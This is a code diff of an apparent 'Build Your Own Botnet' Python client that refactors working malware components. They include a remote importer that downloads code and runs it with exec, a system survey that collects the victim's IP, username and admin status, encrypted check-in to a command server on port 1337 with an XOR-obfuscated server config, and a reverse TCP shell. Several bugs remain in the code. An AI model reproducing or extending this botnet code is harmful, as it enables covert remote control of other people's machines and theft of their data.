@@ -40,61 +40,24 @@ import Crypto.Cipher.AES
 import logging.handlers
 
 
-
-# Variables
-
-
-_debug      = True
-_abort      = False
+try:
+    from urllib2 import urlopen
+except ImportError:
+    from urllib.request import urlopen
 
 
-# Functions
+
+# Globals
 
 
-@contextlib.contextmanager
-def remote_import(modules, base_url='http://localhost:8000/'):
-    """
-    Import modules remotely from a remote server without installing them
-    """
-    importer = Importer(modules, base_url)
-    sys.meta_path.append(importer)
-    yield
-    for importer in sys.meta_path:
-        try:
-            if importer.base_url[:-1] == base_url:
-                sys.meta_path.remove(importer)
-        except: pass
 
+_debug  = True
+_abort  = False
 
-@contextlib.contextmanager
-def github_import(username=None, repo=None, module=None, branch=None, commit=None):
-    """
-    Import modules remotely from a Github repository without installing them
-    """
-    if username == None or repo == None:
-        raise Error("'username' and 'repo' parameters cannot be None")
-    if commit and branch:
-        raise Error("'branch' and 'commit' parameters cannot be both set!")
-    if commit:
-        branch = commit
-    if not branch:
-        branch = 'master'
-    if not module:
-        module = repo
-    if isinstance(module, str):
-        module = [module]
-    url = 'https://raw.githubusercontent.com/{user}/{repo}/{branch}/'.format(user=username, repo=repo, branch=branch)
-    importer = Importer(modules, url)
-    sys.meta_path.append(importer)
-    yield
-    for importer in sys.meta_path:
-        try:
-            if importer.base_url[:-1] == url:
-                sys.meta_path.remove(importer)
-        except: pass
 
         
 # Decorators
+
 
 
 def config(*arg, **options):
@@ -125,48 +88,116 @@ def threaded(function):
     return _threaded
 
 
+
+# Functions
+
+
+
+def __create_github_url(username, repo, branch='master'):
+    github_raw_url = 'https://raw.githubusercontent.com/{user}/{repo}/{branch}/'
+    return github_raw_url.format(user=username, repo=repo, branch=branch)
+
+
+def _add_git_repo(url_builder, username=None, repo=None, module=None, branch=None, commit=None):
+    if username == None or repo == None:
+        raise Error("'username' and 'repo' parameters cannot be None")
+    if commit and branch:
+        raise Error("'branch' and 'commit' parameters cannot be both set!")
+    if commit:
+        branch = commit
+    if not branch:
+        branch = 'master'
+    if not module:
+        module = repo
+    if type(module) == str:
+        module = [module]
+    url = url_builder(username, repo, branch)
+    return add_remote_repo(module, url)
+
+
+def load(module_name, url = 'http://localhost:8000/'):
+    """
+    Directly import module remotely
+    """
+    importer = Importer([module_name], url)
+    loader = importer.find_module(module_name)
+    if loader != None :
+        module = loader.load_module(module_name)
+        if module :
+            return module
+        
+
+def add_remote_repo(modules, base_url='http://localhost:8000/'):
+    """
+    Add an remote importer object to sys.meta_path
+    """
+    importer = Importer(modules, base_url)
+    sys.meta_path.append(importer)
+    return importer
+
+
+def remove_remote_repo(base_url):
+    """
+    Remove the remote repository in sys.meta_path
+    """
+    for importer in sys.meta_path:
+        try:
+            if importer.base_url[:-1] == base_url:
+                sys.meta_path.remove(importer)
+                return True
+        except Exception as e:
+            return False
+
+
+@contextlib.contextmanager
+def remote_repo(modules, base_url='http://localhost:8000/'):
+    """
+    Context manager for remotely importing modules 
+    """
+    importer = add_remote_repo(modules, base_url)
+    yield
+    remove_remote_repo(base_url)
+
+    
+@contextlib.contextmanager
+def github_repo(username=None, repo=None, module=None, branch=None, commit=None):
+    """
+    Context manager for remotely importing modules from Github
+    """
+    importer = _add_git_repo(__create_github_url,
+        username, repo, module=module, branch=branch, commit=commit)
+    yield
+    url = __create_github_url(username, repo, branch)
+    remove_remote_repo(url)
+
+
+
 # Classes
+
 
 
 class Importer(object):
     
     """
     Importer (Build Your Own Botnet)
-
-    """
-    global _debug
-    global _abort
-
-    def __init__(self, modules, base_url):
-        self.module_names   = modules
-        self.base_url       = base_url + '/'
-        self.non_source     = False
-
-    def _get_compiled(self, url) :
-        module_src = None
-        try :
-            module_compiled = urllib.urlopen(url + 'c').read()
-            try :
-                module_src = marshal.loads(module_compiled[8:])
-                return module_src
-            except ValueError :
-                pass
-            try :
-                module_src = marshal.loads(module_compiled[12:])
-                return module_src
-            except ValueError :
-                pass
-        except IOError as e:
-            Util.debug("[-] No compiled version ('.pyc') for '%s' module found!" % url.split('/')[-1])
-        return module_src
     
+    """
+    
+    def __init__(self, modules, base_url):
+        self.module_names = modules
+        self.base_url = base_url + '/'
+        self.non_source = False
+
+
     def find_module(self, fullname, path=None):
-        """
-        Try to find a given module on a remote server
-        """
+        Util.debug("FINDER=================")
+        Util.debug("[!] Searching %s" % fullname)
+        Util.debug("[!] Path is %s" % path)
+        Util.debug("[@] Checking if in declared remote module names >")
         if fullname.split('.')[0] not in self.module_names:
             Util.debug("[-] Not found!")
             return None
+        Util.debug("[@] Checking if built-in >")
         try:
             loader = imp.find_module(fullname, path)
             if loader:
@@ -174,84 +205,93 @@ class Importer(object):
                 Util.debug("[-] Found locally!")
         except ImportError:
             pass
+        Util.debug("[@] Checking if it is name repetition >")
         if fullname.split('.').count(fullname.split('.')[-1]) > 1:
             Util.debug("[-] Found locally!")
             return None
-
-        Util.debug("[*] Module/Package '%s' can be loaded!" % fullname)
+        Util.debug("[*]Module/Package '%s' can be loaded!" % fullname)
         return self
 
 
     def load_module(self, name):
-        """
-        Load a Python module from a remote source
-        """
         imp.acquire_lock()
+        Util.debug("LOADER=================")
         Util.debug("[+] Loading %s" % name)
         if name in sys.modules:
+            Util.debug('[+] Module "%s" already loaded!' % name)
             imp.release_lock()
             return sys.modules[name]
-
         if name.split('.')[-1] in sys.modules:
             imp.release_lock()
+            Util.debug('[+] Module "%s" loaded as a top level module!' % name)
             return sys.modules[name.split('.')[-1]]
-
-        module_url  = self.base_url + '%s.py' % name.replace('.', '/')
+        module_url = self.base_url + '%s.py' % name.replace('.', '/')
         package_url = self.base_url + '%s/__init__.py' % name.replace('.', '/')
-        zip_url     = self.base_url + '%s.zip' % name.replace('.', '/')
-        final_url   = None
-        final_src   = None
-
+        zip_url = self.base_url + '%s.zip' % name.replace('.', '/')
+        final_url = None
+        final_src = None
         try:
+            Util.debug("[+] Trying to import as package from: '%s'" % package_url)
             package_src = None
-            if self.non_source :
-                try:
-                    package_src = self._get_compiled(package_url)
-                except Exception as e:
-                    package_src = None
-            if package_src == None or not self.non_source:
-                try:
-                    package_src = urllib.urlopen(package_url).read()
-                except:
-                    package_src = None
+            if self.non_source :    
+                package_src = self.__fetch_compiled(package_url)
+            if package_src == None :
+                package_src = urlopen(package_url).read()
             final_src = package_src
             final_url = package_url
         except IOError as e:
             package_src = None
             Util.debug("[-] '%s' is not a package:" % name)
-
         if final_src == None:
             try:
+                Util.debug("[+] Trying to import as module from: '%s'" % module_url)
                 module_src = None
-                if self.non_source :
-                    module_src = self._get_compiled(module_url)
-                if module_src == None :
-                    module_src = urllib.urlopen(module_url).read()
+                if self.non_source :    
+                    module_src = self.__fetch_compiled(module_url)
+                if module_src == None : 
+                    module_src = urlopen(module_url).read()
                 final_src = module_src
                 final_url = module_url
             except IOError as e:
                 module_src = None
+                Util.debug("[-] '%s' is not a module:" % name)
                 Util.debug("[!] '%s' not found in HTTP repository. Moving to next Finder." % name)
                 imp.release_lock()
                 return None
-
+        Util.debug("[+] Importing '%s'" % name)
         mod = imp.new_module(name)
-        mod.__loader__  = self
-        mod.__file__    = final_url
-        
+        mod.__loader__ = self
+        mod.__file__ = final_url
         if not package_src:
             mod.__package__ = name
         else:
             mod.__package__ = name.split('.')[0]
-
         mod.__path__ = ['/'.join(mod.__file__.split('/')[:-1]) + '/']
+        Util.debug("[+] Ready to execute '%s' code" % name)
         sys.modules[name] = mod
-        
         exec(final_src, mod.__dict__)
-        
         Util.debug("[+] '%s' imported succesfully!" % name)
         imp.release_lock()
         return mod
+
+    def __fetch_compiled(self, url) :
+        module_src = None
+        try :
+            module_compiled = urlopen(url + 'c').read()  
+            try :
+                module_src = marshal.loads(module_compiled[8:])
+                return module_src
+            except ValueError :
+                pass
+            try :
+                module_src = marshal.loads(module_compiled[12:]) 
+                return module_src
+            except ValueError :
+                pass
+        except IOError as e:
+            Util.debug("[-] No compiled version ('.pyc') for '%s' module found!" % url.split('/')[-1])
+        return module_src
+    
 
 
 class Util():
@@ -264,11 +304,11 @@ class Util():
     global _abort
 
     @staticmethod
-    def taskhandler(host, port):
+    def task_handler(host, port):
         """
         Returns logger configured for reporting task results to server
         """
-        logger  = logging.getLogger(public_ip())
+        logger  = logging.getLogger(Util.public_ip())
         handler = logging.handlers.SocketHandler(host, port)
         logger.setLevel(logging.DEBUG)
         logger.handlers = [handler]
@@ -562,12 +602,12 @@ class Util():
 
 
     @staticmethod
-    def import_modules(base_url='https://raw.githubusercontent.com/colental/byob/master/packages', modules=['configparser', 'Crypto', 'Cryptodome', 'cv2', 'httpimport', 'mss', 'numpy', 'pyHook', 'PyInstaller', 'pyminifier', 'pythoncom', 'pywin32', 'pyxhook', 'requests', 'twilio', 'uuid', 'win32', 'win32com', 'wmi', 'Xlib']):
+    def import_modules(base_url='$REPO$', modules=['configparser', 'Crypto', 'Cryptodome', 'cv2', 'httpimport', 'mss', 'numpy', 'pyHook', 'PyInstaller', 'pyminifier', 'pythoncom', 'pywin32', 'pyxhook', 'requests', 'twilio', 'uuid', 'win32', 'win32com', 'wmi', 'Xlib']):
         """
         import modules remotely without installing from github or a server 
         """
         imports = {}
-        with remote_import(modules, base_url):
+        with remote_repo(modules, base_url):
             for module in modules:
                 try:
                     exec "import %s" % module in globals()
@@ -583,9 +623,8 @@ class Util():
         """
         Use API Key to dynamically locate an active server
         """
-        host, port  = (socket.gethostbyname(socket.gethostname()), 1337)
+        host, port  = 'localhost', 1337
         try:
-            url,api = urllib.urlopen(api_key).read().splitlines()
             if url.startswith('http'):
                 req         = urllib2.Request(url)
                 req.headers = {'API-Key': api}
@@ -593,8 +632,10 @@ class Util():
                 try:
                     host = json.loads(response)['main_ip']
                 except: pass
+            else:
+                Util.debug("Error: invalid URL '{}'".format(url))
             if not ipv4(host):
-                Util.debug("Error: invalid target host '%s'" % host)
+                Util.debug("Error: invalid target host '{}'".format(host))
                 host = 'localhost'
         except Exception as e:
             Util.debug(str(e))
@@ -625,20 +666,7 @@ class Util():
         except Exception as e:
             Util.debug("{} error: {}".format(kwargs.func_name, str(e)))
 
-    @staticmethod
-    def system_info():
-        """
-        Do system survey and return information about host machine
-        """
-        info = {}
-        for func in ['public_ip', 'local_ip', 'platform', 'mac_address', 'architecture', 'username', 'administrator', 'device']:
-            if func in globals():
-                try:
-                    info[func] = eval(func)()
-                except Exception as e:
-                    Util.debug("{} error: {}".format(system.func_name, str(e)))
-        return info
-    
+
     @staticmethod
     def powershell(code):
         """
@@ -747,11 +775,11 @@ class Security():
                 connection.send(Crypto.Util.number.long_to_bytes(xA))
                 xB = Crypto.Util.number.bytes_to_long(connection.recv(256))
                 x  = pow(xB, a, p)
-                return hashlib.new(Crypto.Util.number.long_to_bytes(x)).hexdigest()
+                return hashlib.new('md5', Crypto.Util.number.long_to_bytes(x)).hexdigest()
             except Exception as e:
-                Util.debug("{} error: {}".format(diffiehellman.func_name, str(e)))
+                Util.debug("{} error: {}".format(Security.diffiehellman.func_name, str(e)))
         else:
-            Util.debug("{} erorr: invalid input type - expected '{}', received '{}'".format(diffiehellman.func_name, socket.socket, type(connection)))
+            Util.debug("{} erorr: invalid input type - expected '{}', received '{}'".format(Security.diffiehellman.func_name, socket.socket, type(connection)))
 
     @staticmethod
     def encrypt_aes(data, key):
@@ -764,7 +792,7 @@ class Security():
             output = b''.join((cipher.nonce, tag, ciphertext))
             return base64.b64encode(output)
         except Exception as e:
-            Util.debug("{} error: {}".format(encrypt.func_name, str(e)))
+            Util.debug("{} error: {}".format(Security.encrypt_aes.func_name, str(e)))
 
     @staticmethod
     def decrypt_aes(data, key):
@@ -777,11 +805,11 @@ class Security():
             cipher = Crypto.Cipher.AES.new(key, Crypto.Cipher.AES.MODE_OCB, nonce)
             return cipher.decrypt_and_verify(ciphertext, tag)
         except Exception as e1:
-            Util.debug("{} error: {}".format(decrypt.func_name, str(e1)))
+            Util.debug("{} error: {}".format(Security.decrypt_aes.func_name, str(e1)))
             try:
                 return cipher.decrypt(ciphertext)
             except Exception as e2:
-                return "{} error: {}".format(decrypt.func_name, str(e2))
+                return "{} error: {}".format(Security.decrypt_aes.func_name, str(e2))
 
 
 class Shell():
@@ -795,6 +823,7 @@ class Shell():
 
     def __init__(self):
         self.session    = {}
+        self.info       = self.system_info()
         self.commands   = {cmd: {'method': getattr(self, cmd), 'platforms': getattr(Shell, cmd).platforms, 'usage': getattr(Shell, cmd).usage, 'description': getattr(Shell, cmd).func_doc.strip().rstrip()} for cmd in vars(Shell) if hasattr(vars(Shell)[cmd], 'command') if getattr(vars(Shell)[cmd], 'command')}
         self._socket    = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self._flags     = {'connection': threading.Event(), 'mode': threading.Event(), 'prompt': threading.Event()}
@@ -809,7 +838,7 @@ class Shell():
         while True:
             try:
                 self._flags['prompt'].wait()
-                self.send_task(**{'id': '0'*64, 'client': self.info['uid'], 'command': 'prompt', 'result': '[%d @ {}]>'.format(os.getcwd())})
+                self.send_task(**{'client': self.info['uid'], 'command': 'prompt', 'result': '[%d @ {}]>'.format(os.getcwd())})
                 self._flags['prompt'].clear()
             except Exception as e:
                 Util.debug("{} error: {}".format('prompt', str(e)))
@@ -907,8 +936,8 @@ class Shell():
         """
         try:
             if self.connect(**kwargs):
-                self._workers[self._handler.func_name] = self._handler()
-                self._workers[self.reverse_tcp_shell.func_name] = self.reverse_tcp_shell()
+                self._workers['tasks'] = self._task_handler()
+                self._workers['shell'] = self.reverse_tcp_shell()
             else:
                 Util.debug("connection timed out")
         except Exception as e:
@@ -1209,25 +1238,34 @@ class Shell():
         connect to server and start new session
         """
         try:
-            if kwargs.get('url') and kwargs.get('api'):
-                host, port = Util.find_server(kwargs.get('url'), kwargs.get('api'))
+            host, port = 'localhost', 1337
+            if kwargs.get('config'):
+                url,  api  = Security.decrypt_xor(str(kwargs.get('config')), base64.b64decode('$KEY$')).splitlines()
+                host, port = Util.find_server(url, api)
             self._socket.connect((host, port))
             self._socket.setblocking(True)
             self._flags['connection'].set()
-            Util.debug("Connected to: {}".format(repr(host, port)))
+            Util.debug("Connected to {}:{}".format(host, port))
             Security.session_key = Security.diffiehellman(self._socket)
-            self._socket.sendall(Security.encrypt_aes(json.dumps(self.info), Security.session_key) + '\n')
-            received = ''
-            while '\n' not in received:
+            info = self.system_info()
+            self._socket.sendall(Security.encrypt_aes(json.dumps(info), Security.session_key) + '\n')
+            header_size = struct.calcsize('L')
+            header  = self._socket.recv(header_size)
+            msg_len = struct.unpack('L', header)[0]
+            data    = ''
+            while len(data) < msg_len:
                 try:
-                    received += self._socket.recv(1024)
-                except (socket.error, socket.timeout):
-                    Util.debug('Connection failed\nRestarting in 5 seconds...')
+                    data += self._socket.recv(1)
+                except (socket.timeout, socket.error):
                     break
-            if isinstance(received, bytes) and len(received):
-                return Security.decrypt_aes(received.rstrip(), Security.session_key).strip().rstrip()
+            if isinstance(data, bytes) and len(data):
+                _info = Security.decrypt_aes(data.rstrip(), Security.session_key).strip().rstrip()
+                if isinstance(_info, dict):
+                    self.info = _info
+                return True
         except Exception as e:
             Util.debug("{} error: {}".format(self.connect.func_name, str(e)))
+            return False
 
     
     @config(platforms=['win32','linux2','darwin'], command=True, usage='restart [output]')
@@ -1465,13 +1503,28 @@ class Shell():
         except Exception as e:
             Util.debug("{} error: {}".format(self.process.func_name, str(e)))
 
+
+    def system_info(self):
+        """
+        Do system survey and return information about host machine
+        """
+        info = {}
+        for func in ['public_ip', 'local_ip', 'platform', 'mac_address', 'architecture', 'username', 'administrator', 'device']:
+            if hasattr(UTil, func):
+                try:
+                    info[func] = getattr(Util, func)()
+                except Exception as e:
+                    Util.debug("{} error: {}".format(system.func_name, str(e)))
+        return info
+
+
     @threaded
     def reverse_tcp_shell(self):
         """
         send encrypted shell back to server via outgoing TCP connection
         """
         try:
-            self._workers['prompt'] = self._prompt()
+            self._workers['prompt'] = self._prompt_handler()
             while True:
                 if self._flags['connection'].wait(timeout=1.0):
                     if not self._flags['prompt'].is_set():
